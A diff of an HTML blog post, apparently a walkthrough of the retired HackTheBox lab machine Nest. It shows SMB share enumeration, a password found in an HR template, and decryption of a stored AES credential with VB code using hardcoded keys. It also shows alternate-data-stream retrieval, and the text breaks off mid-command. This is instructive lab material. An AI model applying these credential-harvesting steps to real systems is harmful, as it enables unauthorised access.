@@ -1,162 +1,118 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Nest This box is classified as an easy machine. It was publish on January the 25th by VbScrub. This box is a bit different that the other ones on HTB. Until the last step you never have a shell on the box (and none is needed to root it). All commands and enumeration are done on the SMB service. There is also a personnalized service HQK. Getting user involve understanding a bit of cryptography (homemade combination of base64 and AES) but nothing too complexe. Getting root required to decompile some .NET executable to get some parameter for the homemade encryption." />
-<meta name="keywords" content="security, boot2root, HTB, VB, .NET, RE, SMB, Windows">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Nest"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Nest This box is classified as an easy machine. It was publish on January the 25th by VbScrub. This box is a bit different that the other ones on HTB. Until the last step you never have a shell on the box (and none is needed to root it). All commands and enumeration are done on the SMB service. There is also a personnalized service HQK. Getting user involve understanding a bit of cryptography (homemade combination of base64 and AES) but nothing too complexe. Getting root required to decompile some .NET executable to get some parameter for the homemade encryption."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/06/htb-nest.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-06-07 17:25:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="VB"/>
-  <meta property="article:tag" content=".NET"/>
-  <meta property="article:tag" content="RE"/>
-  <meta property="article:tag" content="SMB"/>
-  <meta property="article:tag" content="Windows"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Nest</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Nest This box is classified as an easy machine. It was publish on January the 25th by VbScrub. This box is a bit different that the other ones on HTB. Until the last step you never have a shell on the box (and none is needed to root it). All commands and enumeration are done on the SMB service. There is also a personnalized service HQK. Getting user involve understanding a bit of cryptography (homemade combination of base64 and AES) but nothing too complexe. Getting root required to decompile some .NET executable to get some parameter for the homemade encryption." name="description"/>
+<meta content="security, boot2root, HTB, VB, .NET, RE, SMB, Windows" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Nest" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Nest This box is classified as an easy machine. It was publish on January the 25th by VbScrub. This box is a bit different that the other ones on HTB. Until the last step you never have a shell on the box (and none is needed to root it). All commands and enumeration are done on the SMB service. There is also a personnalized service HQK. Getting user involve understanding a bit of cryptography (homemade combination of base64 and AES) but nothing too complexe. Getting root required to decompile some .NET executable to get some parameter for the homemade encryption." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/06/htb-nest.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-06-07 17:25:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="VB" property="article:tag"/>
+<meta content=".NET" property="article:tag"/>
+<meta content="RE" property="article:tag"/>
+<meta content="SMB" property="article:tag"/>
+<meta content="Windows" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Nest</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-nest">HTB: Nest</h1>
-    <p>
+<header>
+<h1 id="htb-nest">HTB: Nest</h1>
+<p>
       Posted on 07 Jun 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 10 min read
+        • 10 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.06/nest_card.png" alt="Nest card" width="262"></p>
+</header>
+<div>
+<p><img alt="Nest card" class="align-left" src="/media/2020.06/nest_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/225">Nest</a>
 This box is classified as an easy machine. It was publish on January the 25th by
@@ -169,8 +125,6 @@ HQK.</p>
 of base64 and AES) but nothing too complexe.</p>
 <p>Getting root required to decompile some .NET executable to get some parameter
 for the homemade encryption.</p>
-
-
 <h1>User</h1>
 <h2>Recon</h2>
 <p>We start with an nmap scan. Only the ports 445 (SMB) and 4386 are open.</p>
@@ -184,7 +138,6 @@ PORT     STATE SERVICE
 
 # Nmap done at Mon Jan 27 04:08:04 2020 -- 1 IP address (1 host up) scanned in 485.47 seconds
 </code></pre></div>
-
 <h2>HQK Reporting Service</h2>
 <p>We connect to the port 4386 using telnet. This service allow us to list the
 files on the system but nothing more. The <code>DEBUG</code> function seems interesting but
@@ -192,7 +145,7 @@ we need a password for it.</p>
 <div class="highlight"><pre><span></span><code>#telnet 10.10.10.178 4386
 Trying 10.10.10.178...
 Connected to 10.10.10.178.
-Escape character is &#39;^]&#39;.
+Escape character is '^]'.
 
 HQK Reporting Service V1.2
 
@@ -228,7 +181,6 @@ Use the query ID numbers below with the RUNQUERY command and the directory names
 
 Current Directory: Users
 </code></pre></div>
-
 <h2>SMB</h2>
 <p>We enumerate the shares on the SMB server using metasploit. The share <code>Data</code>
 seems interesting.</p>
@@ -245,17 +197,15 @@ msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run
 [+] 10.10.10.178:445      - Users - (DISK)
 [*] 10.10.10.178:         - Scanned 1 of 1 hosts (100% complete)
 </code></pre></div>
-
 <p>We connect to this share anonymously and start to enumerate the folder and files
 on the share. We quickly find a "Welcome Email" in the HR templates folder.</p>
-<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/Data -U &quot; &quot;%&quot; &quot;
-Try &quot;help&quot; to get a list of possible commands.
+<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/Data -U " "%" "
+Try "help" to get a list of possible commands.
 smb: \&gt; cd Shared\Templates\HR
-smb: \Shared\Templates\HR\&gt; mget &quot;Welcome Email.txt&quot;
+smb: \Shared\Templates\HR\&gt; mget "Welcome Email.txt"
 Get file Welcome Email.txt? y
 getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
 </code></pre></div>
-
 <p>This template email contain the username "TempUser" and its password.</p>
 <div class="highlight"><pre><span></span><code># cat Welcome\ Email.txt
 We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
@@ -272,40 +222,37 @@ Password: welcome2019
 Thank you
 HR
 </code></pre></div>
-
 <h2>SBM as TempUser</h2>
 <p>We can then connect to the SMB share using our "TempUser". We found a lot of
 configuration files. The <code>RU_config.xml</code> contain what seems to be a base64
 password for the c.smith user. We try to decode it using <code>base64 -d</code> but the result is not printable
 characters.</p>
 <div class="highlight"><pre><span></span><code># cat RU_config.xml
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;ConfigFile xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"&gt;
   &lt;Port&gt;389&lt;/Port&gt;
   &lt;Username&gt;c.smith&lt;/Username&gt;
   &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;
 &lt;/ConfigFile&gt;
 </code></pre></div>
-
 <p>Looking a bit more at the files we found the NotepadPlusPlus configuration file
 containing the history of the recently edited files. The
 <code>\\HTB-NEST\Secure$\IT\Carl\Temp.txt</code> seems to be interesting.</p>
 <div class="highlight"><pre><span></span><code>#tail config.xml
-        &lt;Find name=&quot;redeem on&quot; /&gt;
-        &lt;Find name=&quot;192&quot; /&gt;
-        &lt;Replace name=&quot;C_addEvent&quot; /&gt;
+        &lt;Find name="redeem on" /&gt;
+        &lt;Find name="192" /&gt;
+        &lt;Replace name="C_addEvent" /&gt;
     &lt;/FindHistory&gt;
-    &lt;History nbMaxFile=&quot;15&quot; inSubMenu=&quot;no&quot; customLength=&quot;-1&quot;&gt;
-        &lt;File filename=&quot;C:\windows\System32\drivers\etc\hosts&quot; /&gt;
-        &lt;File filename=&quot;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&quot; /&gt;
-        &lt;File filename=&quot;C:\Users\C.Smith\Desktop\todo.txt&quot; /&gt;
+    &lt;History nbMaxFile="15" inSubMenu="no" customLength="-1"&gt;
+        &lt;File filename="C:\windows\System32\drivers\etc\hosts" /&gt;
+        &lt;File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" /&gt;
+        &lt;File filename="C:\Users\C.Smith\Desktop\todo.txt" /&gt;
     &lt;/History&gt;
 &lt;/NotepadPlus&gt;
 </code></pre></div>
-
 <p>We connect to the "Secure$" share and go to Carl's folder. The Temp.txt doesn't
 exist anymore but we found some visual basic code in a WIP folder.</p>
-<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/Secure$ -U &quot;TempUser&quot;%&quot;welcome2019
+<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/Secure$ -U "TempUser"%"welcome2019
 smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\&gt; dir
 .                                   D        0  Wed Aug  7 18:05:54 2019
 ..                                  D        0  Wed Aug  7 18:05:54 2019
@@ -319,23 +266,21 @@ RU Scanner.vbproj.user              A      143  Tue Aug  6 08:55:27 2019
 SsoIntegration.vb                   A      133  Wed Aug  7 18:05:58 2019
 Utils.vb                            A     4888  Wed Aug  7 15:49:35 2019
 </code></pre></div>
-
 <p>We download everything on our computer. The "Module1.vb" file is a module
 loading a XML file "RU_config.xml" and using the Utils library to decode the
 password stored in the file. We already have the XML file.</p>
 <div class="highlight"><pre><span></span><code><span class="k">Module</span><span class="w"> </span><span class="nn">Module1</span><span class="w"></span>
 
 <span class="w">    </span><span class="k">Sub</span><span class="w"> </span><span class="nf">Main</span><span class="p">()</span><span class="w"></span>
-<span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">ConfigFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConfigFile</span><span class="p">.</span><span class="n">LoadFromFile</span><span class="p">(</span><span class="s">&quot;RU_Config.xml&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="n">ConfigFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConfigFile</span><span class="p">.</span><span class="n">LoadFromFile</span><span class="p">(</span><span class="s">"RU_Config.xml"</span><span class="p">)</span><span class="w"></span>
 <span class="w">        </span><span class="k">Dim</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="k">New</span><span class="w"> </span><span class="n">SsoIntegration</span><span class="w"> </span><span class="k">With</span><span class="w"> </span><span class="p">{.</span><span class="n">Username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Config</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">Password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">Config</span><span class="p">.</span><span class="n">Password</span><span class="p">)}</span><span class="w"></span>
-<span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Hello&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Hello"</span><span class="p">)</span><span class="w"></span>
 
 
 <span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Sub</span><span class="w"></span>
 
 <span class="k">End</span><span class="w"> </span><span class="k">Module</span><span class="w"></span>
 </code></pre></div>
-
 <p>The "Utils.vb" file contain the decrypting methods and the passphrase, the salt
 value, the number of password iteration, the initialisation vector (for CBC mode)
 and the key size.</p>
@@ -344,14 +289,14 @@ and the key size.</p>
 <span class="k">Public</span><span class="w"> </span><span class="k">Class</span><span class="w"> </span><span class="nc">Utils</span><span class="w"></span>
 
 <span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">GetLogFilePath</span><span class="p">()</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span>
-<span class="w">        </span><span class="k">Return</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">CurrentDirectory</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Log.txt&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="k">Return</span><span class="w"> </span><span class="n">IO</span><span class="p">.</span><span class="n">Path</span><span class="p">.</span><span class="n">Combine</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">CurrentDirectory</span><span class="p">,</span><span class="w"> </span><span class="s">"Log.txt"</span><span class="p">)</span><span class="w"></span>
 <span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>
 
 <span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Shared</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">DecryptString</span><span class="p">(</span><span class="n">EncryptedString</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">)</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="w"></span>
 <span class="w">        </span><span class="k">If</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span><span class="w"> </span><span class="k">Then</span><span class="w"></span>
 <span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">Empty</span><span class="w"></span>
 <span class="w">        </span><span class="k">Else</span><span class="w"></span>
-<span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;N3st22&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;88552299&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;464R5DFA5DL6LE28&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"></span>
+<span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span><span class="w"> </span><span class="s">"N3st22"</span><span class="p">,</span><span class="w"> </span><span class="s">"88552299"</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"></span>
 <span class="w">        </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span>
 <span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>
 
@@ -359,7 +304,7 @@ and the key size.</p>
 <span class="w">        </span><span class="k">If</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">PlainString</span><span class="p">)</span><span class="w"> </span><span class="k">Then</span><span class="w"></span>
 <span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="kt">String</span><span class="p">.</span><span class="n">Empty</span><span class="w"></span>
 <span class="w">        </span><span class="k">Else</span><span class="w"></span>
-<span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="n">Encrypt</span><span class="p">(</span><span class="n">PlainString</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;N3st22&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;88552299&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;464R5DFA5DL6LE28&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"></span>
+<span class="w">            </span><span class="k">Return</span><span class="w"> </span><span class="n">Encrypt</span><span class="p">(</span><span class="n">PlainString</span><span class="p">,</span><span class="w"> </span><span class="s">"N3st22"</span><span class="p">,</span><span class="w"> </span><span class="s">"88552299"</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"></span>
 <span class="w">        </span><span class="k">End</span><span class="w"> </span><span class="k">If</span><span class="w"></span>
 <span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>
 
@@ -453,11 +398,10 @@ and the key size.</p>
 <span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>
 <span class="k">End</span><span class="w"> </span><span class="k">Class</span><span class="w"></span>
 </code></pre></div>
-
 <p>We fire up a Windows Box, install Microsoft Visual Basic 2010 Express and create
 a new "Application Console project" with a simple module to decode the c.smith
 password we got in the XML file.</p>
-<p><img alt="creating a Application Console project" src="/media/2020.06/nest_02.png"></p>
+<p><img alt="creating a Application Console project" class="image-process-article-image" src="/media/2020.06/derivatives/article-image/nest_02.png"/></p>
 <p>The code is the following. As the console is disappearing just after the run I
 put a second print and run the program in debug mode.</p>
 <div class="highlight"><pre><span></span><code><span class="k">Imports</span><span class="w"> </span><span class="nn">System.Text</span><span class="w"></span>
@@ -466,8 +410,8 @@ put a second print and run the program in debug mode.</p>
 <span class="k">Module</span><span class="w"> </span><span class="nn">Module1</span><span class="w"></span>
 
 <span class="w">    </span><span class="k">Sub</span><span class="w"> </span><span class="nf">Main</span><span class="p">()</span><span class="w"></span>
-<span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">Decrypt</span><span class="p">(</span><span class="s">&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;N3st22&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;88552299&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;464R5DFA5DL6LE28&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">))</span><span class="w"></span>
-<span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">Decrypt</span><span class="p">(</span><span class="s">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="p">,</span><span class="w"> </span><span class="s">"N3st22"</span><span class="p">,</span><span class="w"> </span><span class="s">"88552299"</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s">"464R5DFA5DL6LE28"</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="p">)</span><span class="w"></span>
 <span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">Sub</span><span class="w"></span>
 
 <span class="w">    </span><span class="k">Public</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span><span class="w"> </span><span class="n">cipherText</span><span class="w"> </span><span class="ow">As</span><span class="w"> </span><span class="kt">String</span><span class="p">,</span><span class="w"> </span>_<span class="w"></span>
@@ -529,23 +473,21 @@ put a second print and run the program in debug mode.</p>
 
 <span class="k">End</span><span class="w"> </span><span class="k">Module</span><span class="w"></span>
 </code></pre></div>
-
-<p><img alt="Running in debug mode" src="/media/2020.06/nest_03.png"></p>
+<p><img alt="Running in debug mode" class="image-process-article-image" src="/media/2020.06/derivatives/article-image/nest_03.png"/></p>
 <p>We get the c.smith password: xRxRxPANCAK3SxRxRx. We can now connect to the
 "Users" share using c.smith account. We got the user.txt file.</p>
-<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/Users -U &quot;c.smith&quot;%&quot;xRxRxPANCAK3SxRxRx&quot;
-Try &quot;help&quot; to get a list of possible commands.
+<div class="highlight"><pre><span></span><code># smbclient //10.10.10.178/Users -U "c.smith"%"xRxRxPANCAK3SxRxRx"
+Try "help" to get a list of possible commands.
 smb: \&gt; cd C.Smith\
 smb: \C.Smith\&gt; mget user.txt
 Get file user.txt? y
 getting file \C.Smith\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 </code></pre></div>
-
 <h1>Getting root</h1>
 <p>We enumerate more and found some configuration about the HQK service (the one on
 port 4386). There is also a file "Debug Mode Password.txt".
 The file can be copied on disk but is empty.</p>
-<div class="highlight"><pre><span></span><code>smb: \C.Smith\&gt; cd &quot;HQK Reporting\&quot;
+<div class="highlight"><pre><span></span><code>smb: \C.Smith\&gt; cd "HQK Reporting\"
 smb: \C.Smith\HQK Reporting\&gt; dir
   .                                   D        0  Thu Aug  8 19:06:17 2019
   ..                                  D        0  Thu Aug  8 19:06:17 2019
@@ -555,7 +497,6 @@ smb: \C.Smith\HQK Reporting\&gt; dir
 
             10485247 blocks of size 4096. 6449598 blocks available
 </code></pre></div>
-
 <h2>Alternate data streams</h2>
 <p>The file seems to be empty because its author used the <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">NTFS alternate data
 streams</a>.</p>
@@ -563,7 +504,7 @@ streams</a>.</p>
 using smbclient</a>.</p>
 <p>We require the informations about the file in C.Smith folder and we download the
 file using the alternate data stream.</p>
-<div class="highlight"><pre><span></span><code>root@kalili:~# smbclient //10.10.10.178/Users -U &quot;c.smith&quot;%&quot;xRxRxPANCAK3SxRxRx&quot; -c &#39;allinfo &quot;C.Smith\HQK Reporting\Debug Mode Password.txt&quot;&#39;
+<div class="highlight"><pre><span></span><code>root@kalili:~# smbclient //10.10.10.178/Users -U "c.smith"%"xRxRxPANCAK3SxRxRx" -c 'allinfo "C.Smith\HQK Reporting\Debug Mode Password.txt"'
 altname: DEBUGM~1.TXT
 create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
 access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
@@ -572,20 +513,18 @@ change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
 attributes: A (20)
 stream: [::$DATA], 0 bytes
 stream: [:Password:$DATA], 15 bytes
-root@kalili:~# smbclient //10.10.10.178/Users -U &quot;c.smith&quot;%&quot;xRxRxPANCAK3SxRxRx&quot; -c &#39;get &quot;C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA&quot;
-&gt; &#39;
